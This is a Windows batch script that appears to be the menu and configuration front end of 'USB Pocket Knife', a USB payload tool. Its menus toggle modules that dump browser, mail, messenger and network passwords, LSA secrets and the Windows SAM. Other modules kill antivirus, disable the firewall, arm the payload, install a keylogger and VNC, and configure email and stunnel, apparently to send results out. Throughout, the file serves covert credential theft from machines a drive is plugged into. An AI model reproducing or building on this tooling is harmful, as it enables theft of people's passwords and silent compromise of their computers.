:: initial startup tasks
@echo off
title USB Pocket Knife Utilities - By Leapo
mode con cols=60 lines=40
color 1F

:: Finds the location of the flash partition and sets master variable.
IF EXIST z:\CONFIG\Drive_Location.cfg SET flshdrv=z:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST y:\CONFIG\Drive_Location.cfg SET flshdrv=y:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST x:\CONFIG\Drive_Location.cfg SET flshdrv=x:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST w:\CONFIG\Drive_Location.cfg SET flshdrv=w:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST v:\CONFIG\Drive_Location.cfg SET flshdrv=v:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST u:\CONFIG\Drive_Location.cfg SET flshdrv=u:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST t:\CONFIG\Drive_Location.cfg SET flshdrv=t:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST s:\CONFIG\Drive_Location.cfg SET flshdrv=s:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST r:\CONFIG\Drive_Location.cfg SET flshdrv=r:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST q:\CONFIG\Drive_Location.cfg SET flshdrv=q:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST p:\CONFIG\Drive_Location.cfg SET flshdrv=p:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST o:\CONFIG\Drive_Location.cfg SET flshdrv=o:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST n:\CONFIG\Drive_Location.cfg SET flshdrv=n:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST m:\CONFIG\Drive_Location.cfg SET flshdrv=m:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST l:\CONFIG\Drive_Location.cfg SET flshdrv=l:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST k:\CONFIG\Drive_Location.cfg SET flshdrv=k:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST j:\CONFIG\Drive_Location.cfg SET flshdrv=j:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST i:\CONFIG\Drive_Location.cfg SET flshdrv=i:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST h:\CONFIG\Drive_Location.cfg SET flshdrv=h:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST g:\CONFIG\Drive_Location.cfg SET flshdrv=g:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST f:\CONFIG\Drive_Location.cfg SET flshdrv=f:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST e:\CONFIG\Drive_Location.cfg SET flshdrv=e:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST d:\CONFIG\Drive_Location.cfg SET flshdrv=d:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST c:\CONFIG\Drive_Location.cfg SET flshdrv=c:\
IF EXIST %flshdrv%\CONFIG\Drive_Location.cfg GOTO FlshDrvFound
IF EXIST b:\CONFIG\Drive_Location.cfg SET flshdrv=b:\
:FlshDrvFound

:: Skips the U3 drive check if running from a non U3 drive
IF NOT EXIST %flshdrv%\CONFIG\U3_Drive.cfg GOTO U3DrvFound2

:: Finds the location of the U3 partition and sets master variable.
IF EXIST z:\SYSTEM\Start.bat SET u3=z:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST y:\SYSTEM\Start.bat SET u3=y:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST x:\SYSTEM\Start.bat SET u3=x:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST w:\SYSTEM\Start.bat SET u3=w:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST v:\SYSTEM\Start.bat SET u3=v:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST u:\SYSTEM\Start.bat SET u3=u:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST t:\SYSTEM\Start.bat SET u3=t:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST s:\SYSTEM\Start.bat SET u3=s:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST r:\SYSTEM\Start.bat SET u3=r:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST q:\SYSTEM\Start.bat SET u3=q:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST p:\SYSTEM\Start.bat SET u3=p:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST o:\SYSTEM\Start.bat SET u3=o:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST n:\SYSTEM\Start.bat SET u3=n:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST m:\SYSTEM\Start.bat SET u3=m:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST l:\SYSTEM\Start.bat SET u3=l:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST k:\SYSTEM\Start.bat SET u3=k:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST j:\SYSTEM\Start.bat SET u3=j:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST i:\SYSTEM\Start.bat SET u3=i:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST h:\SYSTEM\Start.bat SET u3=h:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST g:\SYSTEM\Start.bat SET u3=g:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST f:\SYSTEM\Start.bat SET u3=f:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST e:\SYSTEM\Start.bat SET u3=e:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST d:\SYSTEM\Start.bat SET u3=d:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST c:\SYSTEM\Start.bat SET u3=c:\
IF EXIST %u3%\SYSTEM\Start.bat GOTO U3DrvFound
IF EXIST b:\SYSTEM\Start.bat SET u3=b:\
:U3DrvFound
GOTO U3DrvFound3
:U3DrvFound2
SET u3=%flshdrv%
:U3DrvFound3

:: Sets Variables and paths
SET tempfld="%flshdrv%\SYSTEM\TEMP
SET config="%flshdrv%\CONFIG\"
SET progdir="%flshdrv%\SYSTEM\PROGS\"

:: Resets animation counter in case the flash drive was unplugged while updating it
REN %config%\Animation_*.cfg Animation_1.cfg


:MENU
IF EXIST %config%\U3_Drive.cfg GOTO U3MENU
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 			  
echo       ________________________________________________
echo      /                                                \
echo      [ Select an Action to Perform:                   ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ 1. Manage Settings and Modules                 ]
echo      [ 2. Backup Management                           ]
echo      [ 3. Auto Update                                 ]
IF EXIST %config%\_Safety_Check.cfg GOTO MenuSafetyDisabled
             IF NOT EXIST C:\Safety.txt (ECHO      [ 4. Run USB Pocket Knife                        ])
                 IF EXIST C:\Safety.txt (ECHO      [ 4. Open Root Directory                         ]) ELSE (ECHO      [ 5. Open Root Directory                         ])
                 IF EXIST C:\Safety.txt (ECHO      [                                                ])
GOTO MenuSafetyEnabled
:MenuSafetyDisabled
echo      [ 4. Run USB Pocket Knife                        ]
echo      [ 5. Open Root Directory                         ]
:MenuSafetyEnabled
echo      [ 6. Kill antivirus                              ]
echo      [ 7. Run Batch Files                             ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo. 
::  Fix the selection options if Safety.txt is found
IF EXIST %config%\_Safety_Check.cfg GOTO MenuChoiceSafetyDisabled
IF EXIST C:\Safety.txt GOTO MenuChoiceAlt
:MenuChoiceSafetyDisabled
::
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto ComponentsMenu
if '%choice%'=='2' goto BackupMenu
if '%choice%'=='3' goto AutoUpdateConf
if '%choice%'=='4' goto RunPayload
if '%choice%'=='5' goto OpenRoot
if '%choice%'=='6' goto avkill
if '%choice%'=='7' goto BatchFiles
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
:: If the user inputs an invalid selection this wraps the menu back around so they can try again
goto MENU
::
:MenuChoiceAlt
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto ComponentsMenu
if '%choice%'=='2' goto BackupMenu
if '%choice%'=='3' goto AutoUpdateConf
if '%choice%'=='4' goto OpenRoot
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
:: If the user inputs an invalid selection this wraps the menu back around so they can try again
goto MENU
::
:U3MENU
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Select an Action to Perform:                   ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ 1. Manage Settings and Modules                 ]
IF EXIST %config%\_Safety_Check.cfg GOTO U3MenuSafetyDisabled
             IF NOT EXIST C:\Safety.txt (ECHO      [ 2. Run USB Pocket Knife                        ])
                 IF EXIST C:\Safety.txt (ECHO      [ 2. Open Root Directory                         ]) ELSE (ECHO      [ 3. Open Root Directory                         ])
                 IF EXIST C:\Safety.txt (ECHO      [                                                ])
GOTO U3MenuSafetyEnabled
:U3MenuSafetyDisabled
echo      [ 2. Run USB Pocket Knife                        ]
echo      [ 3. Open Root Directory                         ]
:U3MenuSafetyEnabled
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
::  Fix the selection options if Safety.txt is found
IF EXIST %config%\_Safety_Check.cfg GOTO U3MenuChoiceSafetyDisabled
IF EXIST C:\Safety.txt GOTO U3MenuChoiceAlt
:U3MenuChoiceSafetyDisabled
::
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto ComponentsMenu
if '%choice%'=='2' goto RunPayload
if '%choice%'=='3' goto OpenRoot
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
:: If the user inputs an invalid selection this wraps the menu back around so they can try again
goto MENU
::
:U3MenuChoiceAlt
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto ComponentsMenu
if '%choice%'=='2' goto OpenRoot
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
:: If the user inputs an invalid selection this wraps the menu back around so they can try again
goto MENU
::
:ComponentsMenu
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Select a Settings Page to Change:              ]
echo.     \________________________________________________/
echo.     [                                                ]
echo      [ 1. Enable or Disable Modules                   ]
echo      [ 2. Enable or Disable Installers                ]
echo      [ 3. Other Options                               ]
echo      [ 4. Manage Configuration Profiles               ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto ComponentsMenu1
if '%choice%'=='2' goto ComponentsMenu2
if '%choice%'=='3' goto ComponentsMenu3
if '%choice%'=='4' goto ProfileMenu
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto ComponentsMenu
::
:ComponentsMenu1
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Select the number of an item to enable/disable ]
echo      \________________________________________________/
echo      [                                                ]
       IF EXIST %config%\Dump_Cache.cfg (ECHO      [ 1. Dump Cache                          Enabled ]) ELSE (ECHO      [ 1. Dump Cache                         Disabled ])
  IF EXIST %config%\Dump_Firefox_PW.cfg (ECHO      [ 2. Dump Firefox Passwords              Enabled ]) ELSE (ECHO      [ 2. Dump Firefox Passwords             Disabled ])
       IF EXIST %config%\Dump_IE_PW.cfg (ECHO      [ 3. Dump Internet Explorer Passwords    Enabled ]) ELSE (ECHO      [ 3. Dump Internet Explorer Passwords   Disabled ])
 IF EXIST %config%\Dump_LSA_Secrets.cfg (ECHO      [ 4. Dump LSA Secrets                    Enabled ]) ELSE (ECHO      [ 4. Dump LSA Secrets                   Disabled ])
     IF EXIST %config%\Dump_Mail_PW.cfg (ECHO      [ 5. Dump Mail Passwords                 Enabled ]) ELSE (ECHO      [ 5. Dump Mail Passwords                Disabled ])
IF EXIST %config%\Dump_Messenger_PW.cfg (ECHO      [ 6. Dump MSN Messenger Passwords        Enabled ]) ELSE (ECHO      [ 6. Dump MSN Messenger Passwords       Disabled ])
  IF EXIST %config%\Dump_Network_PW.cfg (ECHO      [ 7. Dump Network Passwords              Enabled ]) ELSE (ECHO      [ 7. Dump Network Passwords             Disabled ])
IF EXIST %config%\Dump_Product_Keys.cfg (ECHO      [ 8. Dump Product Keys                   Enabled ]) ELSE (ECHO      [ 8. Dump Product Keys                  Disabled ])
  IF EXIST %config%\Dump_SAM_FGDUMP.cfg (ECHO      [ 9. Dump the Windows SAM using FGDUMP   Enabled ]) ELSE (ECHO      [ 9. Dump the Windows SAM using FGDUMP  Disabled ])
  IF EXIST %config%\Dump_SAM_PWDUMP.cfg (ECHO      [ A. Dump the Windows SAM using PWDUMP   Enabled ]) ELSE (ECHO      [ A. Dump the Windows SAM using PWDUMP  Disabled ])
 IF EXIST %config%\Dump_Update_List.cfg (ECHO      [ B. Dump Windows Update List            Enabled ]) ELSE (ECHO      [ B. Dump Windows Update list           Disabled ])
 IF EXIST %config%\Dump_URL_History.cfg (ECHO      [ C. Dump URL History                    Enabled ]) ELSE (ECHO      [ C. Dump URL History                   Disabled ])
    IF EXIST %config%\Dump_Wifi_Hex.cfg (ECHO      [ D. Dump WIFI Password Hex              Enabled ]) ELSE (ECHO      [ D. Dump WIFI Password Hex             Disabled ])
      IF EXIST %config%\External_IP.cfg (ECHO      [ E. Dump External IP                    Enabled ]) ELSE (ECHO      [ E. Dump External IP                   Disabled ])
 IF EXIST %config%\Network_Services.cfg (ECHO      [ F. Dump Network Services               Enabled ]) ELSE (ECHO      [ F. Dump Network Services              Disabled ])
        IF EXIST %config%\Port_Scan.cfg (ECHO      [ G. Run Port Scan                       Enabled ]) ELSE (ECHO      [ G. Run Port Scan                      Disabled ])
      IF EXIST %config%\System_Info.cfg (ECHO      [ H. Dump System Information             Enabled ]) ELSE (ECHO      [ H. Dump System Information            Disabled ])
       IF EXIST %config%\Run_AVKILL.cfg (ECHO      [ I. Run AVKILL                          Enabled ]) ELSE (ECHO      [ I. Run AVKILL                         Disabled ])
 IF EXIST %config%\Disable_Firewall.cfg (ECHO      [ J. Disable the Windows Firewall        Enabled ]) ELSE (ECHO      [ J. Disable the Windows Firewall       Disabled ])
           IF EXIST %config%\Slurp1.cfg (ECHO      [ K. Slurp Application Info              Enabled ]) ELSE (ECHO      [ K. Slurp Application Info             Disabled ])
		   IF EXIST %config%\Slurp2.cfg (ECHO      [ L. Slurp User Data [Large Files]       Enabled ]) ELSE (ECHO      [ L. Slurp User Files [large Files]     Disabled ])
   IF EXIST %config%\Dump_Chrome_PW.cfg (ECHO      [ N. Dump Google Chrome Passwords        Enabled ]) ELSE (ECHO      [ N. Dump Google Chrome Passwords       Disabled ])
echo      [________________________________________________]
echo      [                                                ]
echo      [ P. Back to Components Menu                     ]
echo      [ M. Return to Main Menu                         ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto ChangeState1
if '%choice%'=='2' goto ChangeState2
if '%choice%'=='3' goto ChangeState3
if '%choice%'=='4' goto ChangeState4
if '%choice%'=='5' goto ChangeState5
if '%choice%'=='6' goto ChangeState6
if '%choice%'=='7' goto ChangeState7
if '%choice%'=='8' goto ChangeState8
if '%choice%'=='9' goto ChangeState9
if '%choice%'=='A' goto ChangeStateA
if '%choice%'=='a' goto ChangeStateA
if '%choice%'=='B' goto ChangeStateB
if '%choice%'=='b' goto ChangeStateB
if '%choice%'=='C' goto ChangeStateC
if '%choice%'=='c' goto ChangeStateC
if '%choice%'=='D' goto ChangeStateD
if '%choice%'=='d' goto ChangeStateD
if '%choice%'=='E' goto ChangeStateE
if '%choice%'=='e' goto ChangeStateE
if '%choice%'=='F' goto ChangeStateF
if '%choice%'=='f' goto ChangeStateF
if '%choice%'=='G' goto ChangeStateG
if '%choice%'=='g' goto ChangeStateG
if '%choice%'=='H' goto ChangeStateH
if '%choice%'=='h' goto ChangeStateH
if '%choice%'=='I' goto ChangeStateI
if '%choice%'=='i' goto ChangeStateI
if '%choice%'=='J' goto ChangeStateJ
if '%choice%'=='j' goto ChangeStateJ
if '%choice%'=='K' goto ChangeStateK
if '%choice%'=='k' goto ChangeStateK
if '%choice%'=='L' goto ChangeStateL
if '%choice%'=='l' goto ChangeStateL
if '%choice%'=='N' goto ChangeStateN
if '%choice%'=='n' goto ChangeStateN
if '%choice%'=='P' goto ComponentsMenu
if '%choice%'=='p' goto ComponentsMenu
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto ComponentsMenu1
::
:ChangeState1
IF EXIST %config%\Dump_Cache.cfg (REN %config%\Dump_Cache.cfg _Dump_Cache.cfg) ELSE (REN %config%\_Dump_Cache.cfg Dump_Cache.cfg)
GOTO ComponentsMenu1
:ChangeState2
IF EXIST %config%\Dump_Firefox_PW.cfg (REN %config%\Dump_Firefox_PW.cfg _Dump_Firefox_PW.cfg) ELSE (REN %config%\_Dump_Firefox_PW.cfg Dump_Firefox_PW.cfg)
GOTO ComponentsMenu1
:ChangeState3
IF EXIST %config%\Dump_IE_PW.cfg (REN %config%\Dump_IE_PW.cfg _Dump_IE_PW.cfg) ELSE (REN %config%\_Dump_IE_PW.cfg Dump_IE_PW.cfg)
GOTO ComponentsMenu1
:ChangeState4
IF EXIST %config%\Dump_LSA_Secrets.cfg (REN %config%\Dump_LSA_Secrets.cfg _Dump_LSA_Secrets.cfg) ELSE (REN %config%\_Dump_LSA_Secrets.cfg Dump_LSA_Secrets.cfg)
GOTO ComponentsMenu1
:ChangeState5
IF EXIST %config%\Dump_Mail_PW.cfg (REN %config%\Dump_Mail_PW.cfg _Dump_Mail_PW.cfg) ELSE (REN %config%\_Dump_Mail_PW.cfg Dump_Mail_PW.cfg)
GOTO ComponentsMenu1
:ChangeState6
IF EXIST %config%\Dump_Messenger_PW.cfg (REN %config%\Dump_Messenger_PW.cfg _Dump_Messenger_PW.cfg) ELSE (REN %config%\_Dump_Messenger_PW.cfg Dump_Messenger_PW.cfg)
GOTO ComponentsMenu1
:ChangeState7
IF EXIST %config%\Dump_Network_PW.cfg (REN %config%\Dump_Network_PW.cfg _Dump_Network_PW.cfg) ELSE (REN %config%\_Dump_Network_PW.cfg Dump_Network_PW.cfg)
GOTO ComponentsMenu1
:ChangeState8
IF EXIST %config%\Dump_Product_Keys.cfg (REN %config%\Dump_Product_Keys.cfg _Dump_Product_Keys.cfg) ELSE (REN %config%\_Dump_Product_Keys.cfg Dump_Product_Keys.cfg)
GOTO ComponentsMenu1
:ChangeState9
IF EXIST %config%\Dump_SAM_FGDUMP.cfg (REN %config%\Dump_SAM_FGDUMP.cfg _Dump_SAM_FGDUMP.cfg) ELSE (REN %config%\_Dump_SAM_FGDUMP.cfg Dump_SAM_FGDUMP.cfg)
GOTO ComponentsMenu1
:ChangeStateA
IF EXIST %config%\Dump_SAM_PWDUMP.cfg (REN %config%\Dump_SAM_PWDUMP.cfg _Dump_SAM_PWDUMP.cfg) ELSE (REN %config%\_Dump_SAM_PWDUMP.cfg Dump_SAM_PWDUMP.cfg)
GOTO ComponentsMenu1
:ChangeStateB
IF EXIST %config%\Dump_Update_List.cfg (REN %config%\Dump_Update_List.cfg _Dump_Update_List.cfg) ELSE (REN %config%\_Dump_Update_List.cfg Dump_Update_List.cfg)
GOTO ComponentsMenu1
:ChangeStateC
IF EXIST %config%\Dump_URL_History.cfg (REN %config%\Dump_URL_History.cfg _Dump_URL_History.cfg) ELSE (REN %config%\_Dump_URL_History.cfg Dump_URL_History.cfg)
GOTO ComponentsMenu1
:ChangeStateD
IF EXIST %config%\Dump_Wifi_Hex.cfg (REN %config%\Dump_Wifi_Hex.cfg _Dump_Wifi_Hex.cfg) ELSE (REN %config%\_Dump_Wifi_Hex.cfg Dump_Wifi_Hex.cfg)
GOTO ComponentsMenu1
:ChangeStateE
IF EXIST %config%\External_IP.cfg (REN %config%\External_IP.cfg _External_IP.cfg) ELSE (REN %config%\_External_IP.cfg External_IP.cfg)
GOTO ComponentsMenu1
:ChangeStateF
IF EXIST %config%\Network_Services.cfg (REN %config%\Network_Services.cfg _Network_Services.cfg) ELSE (REN %config%\_Network_Services.cfg Network_Services.cfg)
GOTO ComponentsMenu1
:ChangeStateG
IF EXIST %config%\Port_Scan.cfg (REN %config%\Port_Scan.cfg _Port_Scan.cfg) ELSE (REN %config%\_Port_Scan.cfg Port_Scan.cfg)
GOTO ComponentsMenu1
:ChangeStateH
IF EXIST %config%\System_Info.cfg (REN %config%\System_Info.cfg _System_Info.cfg) ELSE (REN %config%\_System_Info.cfg System_Info.cfg)
GOTO ComponentsMenu1
:ChangeStateI
IF EXIST %config%\Run_AVKILL.cfg (REN %config%\Run_AVKILL.cfg _Run_AVKILL.cfg) ELSE (REN %config%\_Run_AVKILL.cfg Run_AVKILL.cfg)
GOTO ComponentsMenu1
:ChangeStateJ
IF EXIST %config%\Disable_Firewall.cfg (REN %config%\Disable_Firewall.cfg _Disable_Firewall.cfg) ELSE (REN %config%\_Disable_Firewall.cfg Disable_Firewall.cfg)
GOTO ComponentsMenu1
:ChangeStateK
IF EXIST %config%\Slurp1.cfg (REN %config%\Slurp1.cfg _Slurp1.cfg) ELSE (REN %config%\_Slurp1.cfg Slurp1.cfg)
GOTO ComponentsMenu1
:ChangeStateL
IF EXIST %config%\Slurp2.cfg (REN %config%\Slurp2.cfg _Slurp2.cfg) ELSE (REN %config%\_Slurp2.cfg Slurp2.cfg)
GOTO ComponentsMenu1
:ChangeStateN
IF EXIST %config%\Dump_Chrome_PW.cfg (REN %config%\Dump_Chrome_PW.cfg _Dump_Chrome_PW.cfg) ELSE (REN %config%\_Dump_Chrome_PW.cfg Dump_Chrome_PW.cfg)
GOTO ComponentsMenu1
::
:ComponentsMenu2
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Select the number of an item to enable/disable ]
echo      \________________________________________________/
echo      [                                                ]
           IF EXIST %config%\Haksaw.cfg (ECHO      [ 1. Install Haksaw                      Enabled ]) ELSE (ECHO      [ 1. Install Haksaw                     Disabled ])
              IF EXIST %config%\VNC.cfg (ECHO      [ 2. Install VNC                         Enabled ]) ELSE (ECHO      [ 2. Install VNC                        Disabled ])
         IF EXIST %config%\Keyloger.cfg (ECHO      [ 3. Install Keyloger                    Enabled ]) ELSE (ECHO      [ 3. Install Keyloger                   Disabled ])
	 IF EXIST %config%\Install_NMAP.cfg (ECHO      [ 4. Install NMAP                        Enabled ]) ELSE (ECHO      [ 4. Install NMAP                       Disabled ])
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ P. Back to Components Menu                     ]
echo      [ M. Return to Main Menu                         ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto ChangeState1A
if '%choice%'=='2' goto ChangeState2A
if '%choice%'=='3' goto ChangeState3A
if '%choice%'=='4' goto ChangeState4A
if '%choice%'=='P' goto ComponentsMenu
if '%choice%'=='p' goto ComponentsMenu
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto ComponentsMenu2
::
:ChangeState1A
IF EXIST %config%\Haksaw.cfg (REN %config%\Haksaw.cfg _Haksaw.cfg) ELSE (REN %config%\_Haksaw.cfg Haksaw.cfg)
GOTO ComponentsMenu2
:ChangeState2A
IF EXIST %config%\VNC.cfg (REN %config%\VNC.cfg _VNC.cfg) ELSE (REN %config%\_VNC.cfg VNC.cfg)
GOTO ComponentsMenu2
:ChangeState3A
IF EXIST %config%\Keyloger.cfg (REN %config%\Keyloger.cfg _Keyloger.cfg) ELSE (REN %config%\_Keyloger.cfg Keyloger.cfg)
GOTO ComponentsMenu2
:ChangeState4A
IF EXIST %config%\Install_NMAP.cfg (REN %config%\Install_NMAP.cfg _Install_NMAP.cfg) ELSE (REN %config%\_Install_NMAP.cfg Install_NMAP.cfg)
GOTO ComponentsMenu2
::
:ComponentsMenu3
IF EXIST %config%\U3_Drive.cfg GOTO U3ComponentsMenu3
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Select the number of an item to interact       ]
echo      \________________________________________________/
echo      [                                                ]
         IF EXIST %config%\U3_Drive.cfg (ECHO      [ 1. Is this a U3 drive?                     Yes ]) ELSE (ECHO      [ 1. Is this a U3 Drive?                     No  ])
  IF EXIST %config%\_Disarm_Payload.cfg (ECHO      [ 2. Is the payload armed?                   Yes ]) ELSE (ECHO      [ 2. Is the payload armed?                   No  ])
     IF EXIST %config%\Safety_Check.cfg (ECHO      [ 3. Perform Safety.txt check                Yes ]) ELSE (ECHO      [ 3. Perform Safety.txt check                No  ])
	 IF EXIST %config%\Auto_Restore.cfg (ECHO      [ 4. Restore Payload Before Run              Yes ]) ELSE (ECHO      [ 4. Restore Payload Before Run              No  ])
  IF EXIST %config%\Open_Drive_Logs.cfg (ECHO      [ 5. Open What Folder When Finished?        Logs ]) ELSE (GOTO SkipDrvLogs)
GOTO OpenDrvDone
:SkipDrvLogs
  IF EXIST %config%\Open_Drive_Root.cfg (ECHO      [ 5. Open What Folder When Finished?        Root ]) ELSE (GOTO SkipDrvRoot)
GOTO OpenDrvDone
:SkipDrvRoot
  IF EXIST %config%\Open_Drive_None.cfg (ECHO      [ 5. Open What Folder When Finished?        None ]) ELSE (GOTO SkipDrvNone)
GOTO OpenDrvDone
:SkipDrvNone
ECHO      [ 5. Open What Folder When Finished?        None ]
:OpenDrvDone
         IF EXIST %config%\Shutdown.cfg (ECHO      [ 6. Shutdown PC when finished?              Yes ]) ELSE (ECHO      [ 6. Shutdown PC when finished?              No  ])
echo      [                                                ]
echo      [ 7. Edit Email Configuration                    ]
echo      [ 8. Edit Stunnle Configuration                  ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
